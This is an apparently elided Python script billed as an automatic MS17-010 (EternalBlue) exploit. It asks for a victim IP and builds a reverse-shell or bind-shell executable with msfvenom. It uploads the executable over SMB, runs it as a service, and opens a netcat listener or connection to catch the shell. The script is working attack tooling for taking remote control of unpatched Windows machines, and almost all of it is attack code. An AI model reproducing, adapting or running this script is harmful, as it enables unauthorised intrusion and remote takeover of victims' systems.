...
def smb_pwn(conn, arch):
	...
	smb_send_file(smbConn, payloadname, 'C', '/'+payloadname)
	service_exec(conn, r'cmd /c c:\\'+payloadname)
...
def smb_send_file(smbConn, localSrc, remoteDrive, remotePath):
	with open(localSrc, 'rb') as fp:
		...
		subprocess.Popen("rm "+payloadname, shell=True)
...
def name_generator():	# Generate Malicious filename
	return ''.join(random.choice(string.ascii_lowercase) for _ in range(5))+".exe"

print("  ---------------------------------------------------------")
print("  |                                                       |")
print("  | MS17-010 Exploit - Automatic NC exploit by loopspell  |")
print("  |    	Based On Exploit-db's exploit 42315 by SLEEPYA    |")
print("  ---------------------------------------------------------")
target = raw_input("\n[+] Enter Remote/Victim Host IP: ")
if ipcheck(target):
	pipe_name = raw_input("[+] Enter the Pipe Name (Default NONE):")
	if len(pipe_name)<1:
		pipe_name = None
	print("\n[->] Payload Type")
	print("[->] Reverse Shell Payload = 1")
	print("[->] Bind Shell Payload    = 2\n")
	choicepayload = int(raw_input("[+] Enter Your Payload Choice: "))
	global payloadname,attackerport
	if choicepayload == 1:
		attacker =  raw_input("[+] Enter Attacker/Local Host IP: ")
		if ipcheck(attacker):
			attackerport = raw_input("[+] Enter Attacker/Local Host Port: ")
			payloadname = name_generator()
			print "[+] Attempting To Generate Reverse Shell Payload ..."
			cmdpayload = "msfvenom -p windows/shell_reverse_tcp lhost="+attacker+" lport="+attackerport+" -f exe > "+payloadname
			pgen = subprocess.Popen(cmdpayload, shell=True)
			pgen.wait()
			if os.path.isfile(payloadname):
				print("[+] Reverse Shell Payload Generated Successfully...")
				subprocess.Popen("chmod 777 "+payloadname, shell=True)
				expthread = threading.Thread(target=exploit,args=[target,pipe_name])
				expthread.start()
				nclistner = subprocess.Popen("nc -lvp "+attackerport, shell=True)
				nclistner.poll()
				nclistner.wait()
			else:
			...
			print("[!] ERROR: Invalid Attacker/Local IP Address")
			exit(0)
	elif choicepayload == 2:
			targetport = raw_input("[+] Enter Target/Victim Host Port: ")
			payloadname = name_generator()
			print "[+] Attempting To Generate Bind Shell Payload ..."
			cmdpayload = "msfvenom -p windows/shell_bind_tcp lport="+targetport+" -f exe > "+payloadname
			pgen = subprocess.Popen(cmdpayload, shell=True)
			pgen.wait()
			if os.path.isfile(payloadname):
				print("[+] Reverse Bind Payload Generated Successfully...")
				subprocess.Popen("chmod 777 "+payloadname, shell=True)
				exploit(target,pipe_name)
				nclistner = subprocess.Popen("nc "+target+" "+targetport, shell=True)
				nclistner.poll()
				nclistner.wait()
			else:
				print("[!] ERROR: Couldn't Generate Payload ")
		...
		print("[!] ERROR: Invalid Payload Choice")
		exit(0)	
else:
	print("[!] ERROR: Invalid Remote IP Address")
	exit(0)